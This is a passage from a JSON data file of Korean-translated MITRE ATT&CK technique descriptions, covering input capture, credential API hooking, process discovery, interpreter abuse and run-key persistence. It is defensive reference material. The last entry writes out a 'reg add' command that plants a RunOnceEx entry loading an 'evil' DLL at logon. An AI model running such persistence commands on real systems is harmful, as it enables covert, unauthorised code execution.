      "description": "적대 세력은 일반적인 운영 체제 GUI 구성 요소를 모방하여 사용자에게 자격 증명을 요청하는 것처럼 보이는 신뢰할 수 있는 프롬프트를 표시할 수 있습니다. 현재 사용자 컨텍스트에 존재하는 권한보다 추가 권한이 필요한 프로그램이 실행될 때, 운영 체제는 일반적으로 사용자가 작업을 위해 상승된 권한을 승인하기 위한 적절한 자격 증명을 요청합니다 (예: [사용자 계정 컨트롤 우회](https://attack.mitre.org/techniques/T1548/002)).\n\n적대 세력은 정상적인 사용을 모방하는 여러 가지 이유로 사용자에게 자격 증명을 요청하기 위해 이 기능을 모방할 수 있습니다. 예를 들어 추가 액세스를 요구하는 가짜 설치 프로그램이나 가짜 악성 코드 제거 도구 등이 있습니다. (출처: OSX 악성 코드가 MacKeeper를 악용함) 이러한 유형의 프롬프트는 다양한 언어를 통해 자격 증명을 수집하는 데 사용될 수 있으며, 예를 들어 [AppleScript](https://attack.mitre.org/techniques/T1059/002) (출처: LogRhythm Do You Trust 2014년 10월) (출처: OSX Keydnap 악성 코드) (출처: 자격 증명 대화 상자 스푸핑) 및 [PowerShell](https://attack.mitre.org/techniques/T1059/001) (출처: LogRhythm Do You Trust 2014년 10월) (출처: Enigma 자격 증명 피싱 2015년 1월) (출처: 자격 증명 대화 상자 스푸핑) 등입니다. 리눅스 시스템에서는 적대 세력이 악성 셸 스크립트나 명령 줄에서 사용자에게 자격 증명을 요청하는 대화 상자를 열 수 있습니다 (즉, [유닉스 셸](https://attack.mitre.org/techniques/T1059/004)). (출처: 자격 증명 대화 상자 스푸핑)\n\n또한, 적대 세력은 브라우저나 이메일 클라이언트와 같은 일반적인 소프트웨어 인증 요청을 모방할 수 있습니다. 이는 사용자가 자연스럽게 민감한 사이트나 데이터에 접근할 때 프롬프트를 스푸핑하기 위해 사용자 활동 모니터링 (즉, [브라우저 정보 검색](https://attack.mitre.org/techniques/T1217) 및/또는 [응용 프로그램 창 검색](https://attack.mitre.org/techniques/T1010))과 결합될 수 있습니다.",
      "external_id": "T1056.002",
      "modified": "2024-04-15T23:39:31.474Z",
      "title": "GUI Input Capture",
      "translated": true
    },
    {
      "description": "침입자는 VPN 로그인 페이지와 같은 외부 포털에 코드를 설치하여 해당 서비스에 로그인하려는 사용자의 자격 증명을 캡처하고 전송할 수 있습니다. 예를 들어, 손상된 로그인 페이지는 사용자의 자격 증명을 기록한 후 사용자를 서비스에 로그인시킬 수 있습니다.\n\n이러한 입력 캡처의 변형은 합법적인 관리자 접근을 사용하여 후속 침투를 통해 네트워크 접근을 유지하기 위한 백업 조치로 수행될 수 있으며, 이는 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 및 [유효한 계정](https://attack.mitre.org/techniques/T1078)을 유지하거나, 외부 웹 서비스의 악용을 통한 초기 침투의 일환으로 수행될 수 있습니다. (인용: Volexity Virtual Private Keylogging)",
      "external_id": "T1056.003",
      "modified": "2024-10-15T16:43:43.849Z",
      "title": "Web Portal Capture",
      "translated": true
    },
    {
      "description": "공격자는 사용자의 자격 증명을 수집하기 위해 Windows 응용 프로그램 프로그래밍 인터페이스(API) 함수에 훅을 걸 수 있습니다. 악의적인 훅 메커니즘은 사용자 인증 자격 증명을 노출하는 매개변수를 포함하는 API 호출을 캡처할 수 있습니다.(인용: Microsoft TrojanSpy:Win32/Ursnif.gen!I 2017년 9월) [키로깅](https://attack.mitre.org/techniques/T1056/001)과 달리 이 기술은 사용자 자격 증명을 노출하는 매개변수를 포함하는 API 함수에 특별히 초점을 맞춥니다. 훅킹은 이러한 함수 호출을 리디렉션하는 것으로, 다음과 같은 방식으로 구현될 수 있습니다:\n\n* **훅 프로시저**: 메시지, 키스트로크, 마우스 입력과 같은 이벤트에 응답하여 지정된 코드를 가로채고 실행합니다.(인용: Microsoft Hook Overview)(인용: Elastic Process Injection 2017년 7월)\n* **수입 주소 테이블(IAT) 훅킹**: 프로세스의 IAT를 수정하여 가져온 API 함수를 가리키는 포인터를 저장합니다.(인용: Elastic Process Injection 2017년 7월)(인용: Adlice Software IAT Hooks 2014년 10월)(인용: MWRInfoSecurity Dynamic Hooking 2015)\n* **인라인 훅킹**: API 함수의 첫 번째 바이트를 덮어써서 코드 흐름을 리디렉션합니다.(인용: Elastic Process Injection 2017년 7월)(인용: HighTech Bridge Inline Hooking 2011년 9월)(인용: MWRInfoSecurity Dynamic Hooking 2015)",
      "external_id": "T1056.004",
      "modified": "2024-08-27T21:03:56.385Z",
      "title": "Credential API Hooking",
      "translated": true
    },
    {
      "description": "침해자는 시스템에서 실행 중인 프로세스에 대한 정보를 얻으려고 할 수 있습니다. 획득한 정보는 네트워크 내 시스템에서 실행 중인 일반 소프트웨어/응용 프로그램에 대한 이해를 돕는 데 사용될 수 있습니다. 관리자 또는 이와 유사한 권한이 있는 접근 권한은 보다 나은 프로세스 세부정보를 제공할 수 있습니다. 침해자는 이러한 [프로세스 탐색](https://attack.mitre.org/techniques/T1057) 정보를 자동화된 검색 중에 사용하여 후속 행동을 결정할 수 있습니다. 예를 들어, 침해자가 목표를 완전히 감염시킬지 또는 특정 액션을 시도할지를 결정하는 데 영향을 줄 수 있습니다.\n\nWindows 환경에서 침해자는 [cmd](https://attack.mitre.org/software/S0106)를 사용하여 [Tasklist](https://attack.mitre.org/software/S0057) 유틸리티로 또는 [PowerShell](https://attack.mitre.org/techniques/T1059/001)의 <code>Get-Process</code>를 활용하여 실행 중인 프로세스에 대한 세부정보를 얻을 수 있습니다. 프로세스에 대한 정보는 <code>CreateToolhelp32Snapshot</code>와 같은 [Native API](https://attack.mitre.org/techniques/T1106) 호출의 출력에서 추출될 수도 있습니다. Mac 및 Linux에서는 <code>ps</code> 명령어로 이 작업이 수행됩니다. 침해자는 `/proc`를 통해 프로세스를 열거할 수도 있습니다. \n\n네트워크 장치에서는 `show processes`와 같은 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008) 명령을 사용하여 현재 실행 중인 프로세스를 표시할 수 있습니다. (인용: US-CERT-TA18-106A)(인용: show_processes_cisco_cmd)",
      "external_id": "T1057",
      "modified": "2024-04-16T12:43:55.369Z",
      "title": "Process Discovery",
      "translated": true
    },
    {
      "description": "Windows는 로컬 서비스 구성 정보를 레지스트리의 <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code> 아래에 저장합니다. 서비스의 레지스트리 키에 저장된 정보는 서비스 컨트롤러, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086) 또는 [Reg](https://attack.mitre.org/software/S0075)와 같은 도구를 통해 서비스의 실행 매개변수를 수정하기 위해 조작될 수 있습니다. 레지스트리 키에 대한 접근은 액세스 제어 목록과 권한을 통해 제어됩니다. (출처: MSDN 레지스트리 키 보안)\n\n사용자 및 그룹에 대한 권한이 적절하게 설정되지 않고 서비스의 레지스트리 키에 대한 접근을 허용할 경우, 공격자는 서비스의 binPath/ImagePath를 변경하여 자신이 제어하는 다른 실행 파일을 가리키도록 할 수 있습니다. 서비스가 시작되거나 재시작되면, 공격자가 제어하는 프로그램이 실행되어 공격자는 지속성을 확보하거나 서비스가 설정된 계정 컨텍스트(로컬/도메인 계정, SYSTEM, LocalService 또는 NetworkService)에서 권한 상승을 할 수 있습니다.\n\n공격자는 서비스 실패 매개변수와 관련된 레지스트리 키(예: <code>FailureCommand</code>)를 변경하여 서비스가 실패하거나 의도적으로 손상될 때마다 상승된 권한의 컨텍스트에서 실행될 수 있는 명령을 설정할 수도 있습니다. (출처: TrustedSignal 서비스 실패) (출처: Twitter 서비스 복구 2017년 11월)",
      "external_id": "T1058",
      "modified": "2020-03-19T15:12:13.034Z",
      "title": "Service Registry Permissions Weakness",
      "translated": true
    },
    {
      "description": "공격자는 명령 및 스크립트 인터프리터를 악용하여 명령, 스크립트 또는 바이너리를 실행할 수 있습니다. 이러한 인터페이스와 언어는 컴퓨터 시스템과 상호작용하는 방법을 제공하며, 다양한 플랫폼에서 일반적으로 나타나는 기능입니다. 대부분의 시스템은 기본적으로 명령줄 인터페이스와 스크립팅 기능을 갖추고 있으며, 예를 들어, macOS 및 리눅스 배포판은 특정 종류의 [유닉스 셸](https://attack.mitre.org/techniques/T1059/004)을 포함하고 있는 반면, 윈도우 설치는 [윈도우 명령 셸](https://attack.mitre.org/techniques/T1059/003) 및 [파워셸](https://attack.mitre.org/techniques/T1059/001)을 포함합니다.\n\n또한 [파이썬](https://attack.mitre.org/techniques/T1059/006)과 같은 크로스 플랫폼 인터프리터 및 [자바스크립트](https://attack.mitre.org/techniques/T1059/007), [비주얼 베이직](https://attack.mitre.org/techniques/T1059/005) 등 클라이언트 애플리케이션과 일반적으로 연관된 언어들도 존재합니다.\n\n공격자는 이러한 기술을 다양한 방식으로 악용하여 임의의 명령을 실행할 수 있습니다. 명령과 스크립트는 피해자에게 유인 문서로 전달되는 [초기 접근](https://attack.mitre.org/tactics/TA0001) 페이로드에 내장되거나 기존 C2에서 다운로드된 보조 페이로드로 포함될 수 있습니다. 공격자는 또한 인터랙티브 터미널/셸을 통해 명령을 실행하거나 다양한 [원격 서비스](https://attack.mitre.org/techniques/T1021)를 활용하여 원격 실행을 달성할 수 있습니다. (인용: 파워셸 원격 명령)(인용: 시스코 IOS 소프트웨어 무결성 보장 - 명령 기록)(인용: 파이썬의 원격 셸 실행)",
      "external_id": "T1059",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Command and Scripting Interpreter",
      "translated": true
    },
    {
      "description": "공격자는 PowerShell 명령 및 스크립트를 악용하여 실행할 수 있습니다. PowerShell은 Windows 운영 체제에 포함된 강력한 대화형 명령줄 인터페이스 및 스크립트 환경입니다. 공격자는 PowerShell을 사용하여 정보 탐색 및 코드 실행 등 여러 작업을 수행할 수 있습니다. 예를 들어, <code>Start-Process</code> cmdlet을 사용하여 실행 파일을 실행하거나 <code>Invoke-Command</code> cmdlet을 사용하여 로컬 또는 원격 컴퓨터에서 명령을 실행할 수 있습니다(단, 원격 시스템에 연결하기 위해서는 관리자 권한이 필요합니다).\n\nPowerShell은 또한 인터넷에서 실행 파일을 다운로드하여 실행하는 데 사용할 수 있으며, 이는 디스크에 저장하지 않고도 메모리에서 실행할 수 있습니다.\n\nEmpire, PowerSploit, PoshC2, PSAttack 등 여러 PowerShell 기반 공격 테스트 도구가 제공됩니다.\n\nPowerShell 명령/스크립트는 <code>powershell.exe</code> 바이너리를 직접 호출하지 않고도 실행할 수 있으며, 이는 PowerShell의 기본 <code>System.Management.Automation</code> 어셈블리 DLL에 접근하는 인터페이스를 통해 가능합니다. 이러한 인터페이스는 .NET 프레임워크와 Windows 공용 언어 인터페이스(CLI)를 통해 제공됩니다.",
      "external_id": "T1059.001",
      "modified": "2024-10-15T16:39:13.228Z",
      "title": "PowerShell",
      "translated": true
    },
    {
      "description": "적대자는 AppleScript를 악용하여 실행할 수 있습니다. AppleScript는 애플리케이션과 운영 체제의 일부를 제어하기 위해 서로 다른 애플리케이션 간의 메시지인 AppleEvents를 통해 설계된 macOS 스크립팅 언어입니다.(출처: Apple AppleScript) 이러한 AppleEvent 메시지는 독립적으로 또는 AppleScript로 쉽게 스크립팅할 수 있습니다. 이러한 이벤트는 열려 있는 윈도우를 찾거나, 키 입력을 전송하거나, 거의 모든 열려 있는 애플리케이션과 로컬 또는 원격으로 상호작용할 수 있습니다.\n\n스크립트는 <code>osascript /path/to/script</code> 또는 <code>osascript -e \"script here\"</code>와 같은 명령줄에서 실행될 수 있습니다. 명령줄 외에도 스크립트는 Mail 규칙, Calendar.app 알람, Automator 워크플로우 등 여러 방법으로 실행될 수 있습니다. AppleScripts는 파일의 시작 부분에 <code>#!/usr/bin/osascript</code>를 추가하여 일반 텍스트 셸 스크립트로 실행할 수도 있습니다.(출처: SentinelOne AppleScript)\n\nAppleScripts는 실행을 위해 <code>osascript</code>를 호출할 필요가 없습니다. 그러나 macOS의 [네이티브 API](https://attack.mitre.org/techniques/T1106)인 <code>NSAppleScript</code> 또는 <code>OSAScript</code>를 사용하여 mach-O 바이너리 내에서 실행될 수 있으며, 두 방식 모두 <code>/usr/bin/osascript</code> 명령줄 유틸리티와 독립적으로 코드를 실행합니다.\n\n적대자는 AppleScript를 악용하여 열려 있는 SSH 연결과 상호작용하거나 원격 기기로 이동하거나 심지어 사용자에게 가짜 대화 상자를 표시하는 등 다양한 동작을 수행할 수 있습니다. 이러한 이벤트는 원격에서 애플리케이션을 시작할 수는 없지만(로컬에서는 시작할 수 있음), 이미 원격으로 실행 중인 애플리케이션과 상호작용할 수 있습니다. macOS 10.10 Yosemite 이상에서는 AppleScript가 [네이티브 API](https://attack.mitre.org/techniques/T1106)를 실행할 수 있는 기능이 있으며, 이는 그렇지 않으면 mach-O 바이너리 형식으로 컴파일하고 실행해야만 할 수 있습니다.(출처: SentinelOne macOS Red Team) 스크립팅 언어이기 때문에 [Python](https://attack.mitre.org/techniques/T1059/006)을 통한 리버스 셸과 같은 보다 일반적인 기술을 시작하는 데에도 사용할 수 있습니다.(출처: Macro Malware Targets Macs)",
      "external_id": "T1059.002",
      "modified": "2024-10-15T14:18:20.087Z",
      "title": "AppleScript",
      "translated": true
    },
    {
      "description": "적대자는 실행을 위해 Windows 명령 셸을 악용할 수 있습니다. Windows 명령 셸([cmd](https://attack.mitre.org/software/S0106))은 Windows 시스템의 기본 명령 프롬프트입니다. Windows 명령 프롬프트는 시스템의 거의 모든 측면을 제어하는 데 사용할 수 있으며, 다양한 명령의 하위 집합에 대해 요구되는 권한 수준이 다릅니다. 명령 프롬프트는 [SSH](https://attack.mitre.org/techniques/T1021/004)와 같은 [원격 서비스](https://attack.mitre.org/techniques/T1021)를 통해 원격으로 호출될 수 있습니다. (출처: Windows의 SSH)\n\n배치 파일(.bat 또는 .cmd 등)도 셸에 실행할 명령의 순서 목록을 제공하며, 조건문 및 루프와 같은 일반적인 스크립팅 작업도 수행할 수 있습니다. 배치 파일의 일반적인 용도에는 긴 작업이나 반복 작업, 여러 시스템에서 동일한 명령 집합을 실행해야 하는 경우가 포함됩니다.\n\n적대자는 [cmd](https://attack.mitre.org/software/S0106)를 활용하여 다양한 명령 및 페이로드를 실행할 수 있습니다. 일반적인 사용 사례로는 [cmd](https://attack.mitre.org/software/S0106)를 사용하여 단일 명령을 실행하거나, 명령 및 제어 채널을 통해 입력 및 출력을 전달받아 [cmd](https://attack.mitre.org/software/S0106)를 대화형으로 악용하는 경우가 있습니다.",
      "external_id": "T1059.003",
      "modified": "2024-10-15T15:19:56.540Z",
      "title": "Windows Command Shell",
      "translated": true
    },
    {
      "description": "공격자는 실행을 위해 유닉스 셸 명령과 스크립트를 악용할 수 있습니다. 유닉스 셸은 리눅스와 macOS 시스템의 기본 명령 프롬프트로, 특정 운영 체제나 배포판에 따라 여러 variations (예: sh, bash, zsh 등)이 존재합니다. 유닉스 셸은 시스템의 모든 측면을 제어할 수 있으며, 특정 명령은 상승된 권한이 필요합니다.\n\n유닉스 셸은 명령의 순차적인 실행과 조건문 및 루프와 같은 일반적인 프로그래밍 작업을 가능하게 하는 스크립트를 지원합니다. 셸 스크립트의 일반적인 사용 사례로는 긴 작업이나 반복적인 작업, 여러 시스템에서 동일한 명령 집합을 실행해야 할 때가 있습니다.\n\n공격자는 유닉스 셸을 악용하여 다양한 명령이나 페이로드를 실행할 수 있습니다. 대화형 셸은 명령 및 제어 채널을 통해 액세스하거나 SSH와 같은 수평 이동 중에 접근할 수 있습니다. 공격자는 또한 셸 스크립트를 활용하여 피해자에게 여러 명령을 전달하고 실행하거나 지속성을 위한 페이로드의 일환으로 사용할 수 있습니다.",
      "external_id": "T1059.004",
      "modified": "2024-10-15T15:17:19.136Z",
      "title": "Unix Shell",
      "translated": true
    },
    {
      "description": "적대자는 실행을 위해 비주얼 베이직(VB)을 악용할 수 있습니다. VB는 Microsoft가 만든 프로그래밍 언어로, Windows API를 통해 [컴포넌트 오브젝트 모델](https://attack.mitre.org/techniques/T1559/001) 및 [네이티브 API](https://attack.mitre.org/techniques/T1106)와의 상호 운용성을 가지고 있습니다. 레거시 언어로 분류되며 미래의 발전이 계획되어 있지 않지만, VB는 .NET Framework 및 크로스 플랫폼 .NET Core에 통합되어 지원됩니다.(인용: VB .NET 2020년 3월)(인용: VB Microsoft)\n\nVB를 기반으로 한 파생 언어도 생성되었습니다. 예를 들어, 비주얼 베이직 포 애플리케이션(VBA) 및 VBScript가 있습니다. VBA는 Microsoft Office와 여러 서드파티 애플리케이션에 내장된 이벤트 기반 프로그래밍 언어입니다.(인용: Microsoft VBA)(인용: Wikipedia VBA) VBA는 문서에 매크로를 포함하여 작업 및 기타 기능의 실행을 자동화하는 데 사용됩니다. VBScript는 Windows 호스트의 기본 스크립팅 언어이며, 또한 HTML 애플리케이션(HTA) 웹페이지에서 JavaScript(https://attack.mitre.org/techniques/T1059/007)를 대신하여 사용할 수 있습니다(대부분의 현대 브라우저는 VBScript 지원이 없습니다).(인용: Microsoft VBScript)\n\n적대자는 VB 페이로드를 사용하여 악성 명령을 실행할 수 있습니다. 일반적인 악성 사용은 VBScript를 통해 동작의 실행을 자동화하거나 VBA 내용을 [스피어피싱 첨부파일](https://attack.mitre.org/techniques/T1566/001) 페이로드에 삽입하는 것(여기에는 실행을 가능하게 하기 위해 [웹 마크 우회](https://attack.mitre.org/techniques/T1553/005)를 포함할 수 있음)이 포함됩니다.(인용: 기본 VBS 매크로 차단)",
      "external_id": "T1059.005",
      "modified": "2024-10-15T16:43:27.104Z",
      "title": "Visual Basic",
      "translated": true
    },
    {
      "description": "공격자는 실행을 위해 Python 명령어와 스크립트를 악용할 수 있습니다. Python은 매우 인기 있는 스크립트/프로그래밍 언어로, 많은 기능을 수행할 수 있는 능력을 가지고 있습니다. Python은 명령줄에서 직접 ( <code>python.exe</code> 인터프리터를 통해) 인터랙티브하게 실행할 수 있으며, .py 형식의 스크립트를 작성하여 다양한 시스템에 배포할 수도 있습니다. 또한 Python 코드는 이진 실행 파일로 컴파일될 수 있습니다. (인용: Zscaler APT31 Covid-19 2020년 10월)\n\nPython은 파일 작업 및 장치 I/O와 같은 기본 시스템과 상호 작용하기 위한 많은 내장 패키지를 제공합니다. 공격자는 이러한 라이브러리를 사용하여 명령어나 다른 스크립트를 다운로드하고 실행할 수 있으며, 다양한 악의적인 행동을 수행할 수 있습니다.",
      "external_id": "T1059.006",
      "modified": "2024-01-30T18:35:58.021Z",
      "title": "Python",
      "translated": true
    },
    {
      "description": "위협 행위자는 다양한 JavaScript 구현을 악용하여 실행할 수 있습니다. JavaScript (JS)는 플랫폼 독립적인 스크립팅 언어로, 주로 웹페이지의 스크립트와 관련이 있으며, 런타임 환경에서 브라우저 외부에서도 실행될 수 있습니다. (출처: NodeJS)\n\nJScript는 동일한 스크립팅 표준의 Microsoft 구현입니다. JScript는 Windows Script 엔진을 통해 해석되며, 따라서 [구성 요소 객체 모델](https://attack.mitre.org/techniques/T1559/001) 및 Internet Explorer HTML 응용 프로그램 (HTA) 페이지와 같은 Windows의 많은 구성 요소와 통합됩니다. (출처: JScrip May 2018)(출처: Microsoft JScript 2007)(출처: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA)는 macOS의 스크립팅 언어로, JavaScript 기반이며, OSX 10.10부터 Apple의 Open Scripting Architecture (OSA)의 일부로 포함되었습니다. Apple의 OSA는 애플리케이션을 제어하고, 운영 체제와 인터페이스하며, Apple의 내부 API에 접근할 수 있는 스크립팅 기능을 제공합니다. OSX 10.10부터 OSA는 JXA와 [AppleScript](https://attack.mitre.org/techniques/T1059/002)라는 두 가지 언어만 지원합니다. 스크립트는 명령줄 유틸리티 <code>osascript</code>를 통해 실행할 수 있으며, <code>osacompile</code>를 통해 애플리케이션이나 스크립트 파일로 컴파일할 수 있고, OSAKit 프레임워크를 활용하여 다른 프로그램의 메모리에서 컴파일되고 실행될 수도 있습니다. (출처: Apple About Mac Scripting 2016)(출처: SpecterOps JXA 2020)(출처: SentinelOne macOS Red Team)(출처: Red Canary Silver Sparrow Feb2021)(출처: MDSec macOS JXA and VSCode)\n\n위협 행위자는 다양한 JavaScript 구현을 악용하여 다양한 동작을 수행할 수 있습니다. 일반적인 사용 중 하나는 [드라이브 바이 침해](https://attack.mitre.org/techniques/T1189)의 일환으로 웹사이트에 악성 스크립트를 호스팅하거나 이러한 스크립트 파일을 다운로드하여 보조 페이로드로 실행하는 것입니다. 이러한 페이로드는 텍스트 기반이기 때문에, 위협 행위자가 [모호한 파일이나 정보](https://attack.mitre.org/techniques/T1027)의 일환으로 콘텐츠를 난독화하는 것도 매우 일반적입니다.",
      "external_id": "T1059.007",
      "modified": "2024-07-30T14:12:52.698Z",
      "title": "JavaScript",
      "translated": true
    },
    {
      "description": "공격자는 네트워크 장치에서 스크립팅 또는 내장된 명령줄 인터프리터(CLI)를 악용하여 악성 명령 및 페이로드를 실행할 수 있습니다. CLI는 사용자와 관리자가 시스템 정보를 조회하고, 장치의 작업을 수정하거나 진단 및 관리 기능을 수행하기 위해 장치와 상호작용하는 주요 수단입니다. CLI는 다양한 명령에 필요한 여러 권한 수준을 포함하고 있습니다.\n\n스크립팅 인터프리터는 작업을 자동화하고 네트워크 운영 체제에 포함된 명령 세트를 넘어 기능을 확장합니다. CLI 및 스크립팅 인터프리터는 직접 콘솔 연결 또는 telnet 또는 SSH와 같은 원격 수단을 통해 접근할 수 있습니다.\n\n공격자는 네트워크 CLI를 사용하여 네트워크 장치의 동작 방식을 변경할 수 있습니다. CLI는 트래픽 흐름을 조작하여 데이터를 가로채거나 조작하거나, 악성 시스템 소프트웨어를 로드하기 위해 시작 구성 매개변수를 수정하거나, 감지를 피하기 위해 보안 기능 또는 로깅을 비활성화하는 데 사용될 수 있습니다. (출처: Cisco Synful Knock Evolution)",
      "external_id": "T1059.008",
      "modified": "2022-04-19T20:28:09.848Z",
      "title": "Network Device CLI",
      "translated": true
    },
    {
      "description": "공격자는 클라우드 API를 악용하여 악성 명령을 실행할 수 있습니다. 클라우드 환경에서 제공되는 API는 다양한 기능을 제공하며, 테넌트의 거의 모든 측면에 대한 프로그래밍 방식의 접근을 위한 기능이 풍부한 방법입니다. 이러한 API는 명령 줄 인터프리터(CLI), 브라우저 내 클라우드 셸, [PowerShell](https://attack.mitre.org/techniques/T1059/001) 모듈인 Azure for PowerShell(출처: Microsoft - Azure PowerShell) 또는 [Python](https://attack.mitre.org/techniques/T1059/006)과 같은 언어에 대해 제공되는 소프트웨어 개발 키트(SDK)를 통해 활용될 수 있습니다.\n\n클라우드 API 기능은 컴퓨팅, 저장소, 아이덴티티 및 접근 관리(IAM), 네트워킹 및 보안 정책과 같은 테넌트의 모든 주요 서비스에 대한 관리 접근을 허용할 수 있습니다.\n\n적절한 권한이 부여되면(종종 [애플리케이션 접근 토큰](https://attack.mitre.org/techniques/T1550/001) 및 [웹 세션 쿠키](https://attack.mitre.org/techniques/T1550/004)과 같은 자격 증명을 통해), 공격자는 클라우드 API를 악용하여 악성 행동을 실행하는 다양한 기능을 호출할 수 있습니다. 예를 들어, CLI 및 PowerShell 기능은 클라우드 호스팅 또는 온프레미스 호스트에 설치된 바이너리를 통해 접근하거나, 많은 클라우드 플랫폼(AWS, Azure 및 GCP 등)에서 제공하는 브라우저 기반 클라우드 셸을 통해 접근할 수 있습니다. 이러한 클라우드 셸은 종종 클라우드 환경에서 호스팅되는 컨테이너로 제공되는 CLI 및/또는 스크립팅 모듈을 사용하기 위한 패키지 통합 환경입니다.",
      "external_id": "T1059.009",
      "modified": "2024-10-15T15:44:20.143Z",
      "title": "Cloud API",
      "translated": true
    },
    {
      "description": "공격자는 AutoIT 및 AutoHotKey 자동화 스크립트를 사용하여 명령을 실행하고 악의적인 작업을 수행할 수 있습니다. AutoIT 및 AutoHotKey(AHK)는 사용자가 Windows 작업을 자동화할 수 있도록 하는 스크립트 언어입니다. 이러한 자동화 스크립트는 버튼 클릭, 텍스트 입력, 프로그램 열기 및 닫기와 같은 다양한 작업을 수행하는 데 사용될 수 있습니다.\n\n공격자는 AHK(`.ahk`) 및 AutoIT(`.au3`) 스크립트를 사용하여 피해자의 시스템에서 악성 코드를 실행할 수 있습니다. 예를 들어, 공격자는 AHK를 사용하여 페이로드 및 키로거와 같은 기타 모듈형 악성 소프트웨어를 실행한 사례가 있습니다. 공격자는 또한 내장된 악성 코드를 포함하는 사용자 지정 AHK 파일을 피싱 페이로드로 사용한 적이 있습니다.\n\n이러한 스크립트는 자체 포함 실행 가능한 페이로드(`.exe`)로 컴파일될 수도 있습니다.",
      "external_id": "T1059.010",
      "modified": "2024-04-28T15:58:48.119Z",
      "title": "AutoHotKey & AutoIT",
      "translated": true
    },
    {
      "description": "적대적인 공격자는 실행을 위해 Lua 명령어와 스크립트를 악용할 수 있습니다. Lua는 주로 애플리케이션 내의 임베디드 용도로 설계된 크로스 플랫폼 스크립팅 및 프로그래밍 언어입니다. Lua는 명령줄(독립 실행형 lua 인터프리터를 통해), 스크립트(코드 <code>.lua</code>), 또는 Lua가 내장된 프로그램(코드 <code>struct lua_State</code>를 통해)에서 실행될 수 있습니다. (출처: Lua 메인 페이지) (출처: Lua 상태)\n\n적대적인 공격자는 악의적인 목적으로 Lua 스크립트를 실행할 수 있습니다. 공격자는 기존 Lua 인터프리터를 통합하거나 악용하거나 교체하여 런타임 중에 악의적인 Lua 명령어 실행을 허용할 수 있습니다. (출처: PoetRat Lua) (출처: Lua Proofpoint Sunseed) (출처: Cyphort EvilBunny) (출처: Kaspersky Lua)",
      "external_id": "T1059.011",
      "modified": "2024-10-01T15:19:54.163Z",
      "title": "Lua",
      "translated": true
    },
    {
      "description": "공격자는 프로그램을 시작 폴더에 추가하거나 레지스트리 실행 키를 통해 참조함으로써 지속성을 확보할 수 있습니다. 레지스트리의 \"실행 키(run keys)\"에 항목을 추가하거나 시작 폴더에 추가하면 사용자가 로그인할 때 참조된 프로그램이 실행됩니다. (인용: Microsoft Run Key) 이러한 프로그램은 사용자 맥락에서 실행되며 해당 계정의 권한 수준을 가집니다.\n\n시작 폴더에 프로그램을 배치하면 사용자가 로그인할 때 해당 프로그램이 실행됩니다. 개별 사용자 계정에 대한 시작 폴더와 모든 사용자 계정에 대해 확인되는 시스템 전체 시작 폴더가 존재합니다.\n\n현재 사용자에 대한 시작 폴더 경로는 다음과 같습니다:\n* <code>C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>\n모든 사용자에 대한 시작 폴더 경로는 다음과 같습니다:\n* <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>\n\nWindows 시스템에서 기본적으로 생성되는 실행 키는 다음과 같습니다:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\n<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code>도 사용 가능하지만 Windows Vista 및 이후 버전에서는 기본적으로 생성되지 않습니다. 레지스트리 실행 키 항목은 프로그램을 직접 참조하거나 종속성으로 나열할 수 있습니다. (인용: Microsoft RunOnceEx APR 2018) 예를 들어, \"Depend\" 키를 사용하여 로그온 시 DLL을 로드할 수 있습니다: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (인용: Oddvar Moe RunOnceEx Mar 2018)\n\n다음 레지스트리 키를 사용하여 지속성을 위한 시작 폴더 항목을 설정할 수 있습니다:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\n다음 레지스트리 키는 부팅 시 서비스의 자동 시작을 제어할 수 있습니다:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\n정책 설정을 사용하여 시작 프로그램을 지정하면 두 개의 레지스트리 키 중 하나에 해당하는 값이 생성됩니다:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nWinlogon 키는 Windows 7에서 사용자가 컴퓨터에 로그인할 때 발생하는 작업을 제어합니다. 이러한 작업의 대부분은 운영 체제의 제어 하에 있지만, 여기에서 사용자 정의 작업도 추가할 수 있습니다. <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> 및 <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> 하위 